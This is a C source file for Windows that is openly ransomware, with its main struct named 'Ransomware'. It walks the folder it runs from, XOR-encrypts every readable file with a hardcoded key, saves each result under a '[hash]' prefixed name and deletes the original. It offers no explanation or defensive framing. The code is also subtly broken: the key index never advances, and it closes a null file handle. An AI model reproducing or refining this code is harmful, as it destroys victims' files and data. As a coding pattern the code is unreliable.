#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <dirent.h>
#include <stdbool.h>

typedef struct Ransomware
{
	char *Name;
	BYTE *Data;
	int fSize;
} _FILE_;

int			_GetFileSize			(FILE *file);
char	*	_CreateNewFileName		(char *fileName);
int			_EncriptFile			(_FILE_ currentFile, char *key);
_FILE_		_LoadCurrentFile		(char *fileName);
char	*	_GetCurrentPath			();
bool		_ValidateFile			(char *fileName);

int main()
{
	
	char key[] = {"Vª╣Ù#A*~#═¸Ù#3¢kéî¤F¾°sú▀wtèklsy±?Çd¤■7┴iß'üÆÍE©æ¬Ë╚░╝Øz?fFò"};
	
	DIR *dir;
	struct dirent *lsdir;
	_FILE_ currentFile;

	dir = opendir(_GetCurrentPath());

	while((lsdir=readdir(dir)) != NULL)
	{
		if (_ValidateFile(lsdir->d_name))
		{
			puts(lsdir->d_name);
			currentFile = _LoadCurrentFile(lsdir->d_name);
			_EncriptFile(currentFile, key);
		}
	}
	
	return 0;
}

_FILE_ _LoadCurrentFile(char *fileName)
{
	_FILE_ fileToLoad;

	FILE *file = fopen(fileName, "rb");

	fileToLoad.Name = fileName;
	fileToLoad.fSize = _GetFileSize(file);
	fileToLoad.Data = (BYTE *)malloc((fileToLoad.fSize + 1) * sizeof(BYTE));

	fread(fileToLoad.Data, fileToLoad.fSize, 1, file);

	fclose(file);

	return fileToLoad;
}

int _EncriptFile(_FILE_ fileToEncript, char *key)
{
	int i, j = 0;

	FILE *file = fopen(_CreateNewFileName(fileToEncript.Name), "wb");

	for (i = 0; i < fileToEncript.fSize; ++i)
	{
		fileToEncript.Data[i] = fileToEncript.Data[i] ^ key[j];
		if (j == strlen(key)){ j = 0; }
	}

	fwrite(fileToEncript.Data, 1, fileToEncript.fSize, file);

	free(fileToEncript.Data);
	fclose(file);

	remove(fileToEncript.Name);
	return 0;
}

bool _ValidateFile(char *fileName)
{
	FILE *file = fopen(fileName, "rb");
	if (file == NULL){
		fclose(file);
		return false;
	}else{
		fclose(file);
		return true;
	}
}

char *_CreateNewFileName(char *fileName)
{
	static char tag[] = {"[hash]"};

	static char newFileName[MAX_PATH];
	
	strcpy(newFileName, tag);
	strcat(newFileName, fileName);

	return newFileName;
}

char *_GetCurrentPath()
{
	static char src[MAX_PATH];
	GetModuleFileName(NULL, src, MAX_PATH);

	int i = 0;

	while(src[i] != '\0'){i++;}
	while(src[i] != '\\'){i--;} i++;
	src[i] = '\0';

	return src;
}

int _GetFileSize(FILE *file)
{
	if (file == NULL){
		return 1;
	}
	fseek(file, 0, SEEK_END);
	int fileSize = ftell(file);
	rewind(file);
	return fileSize;
}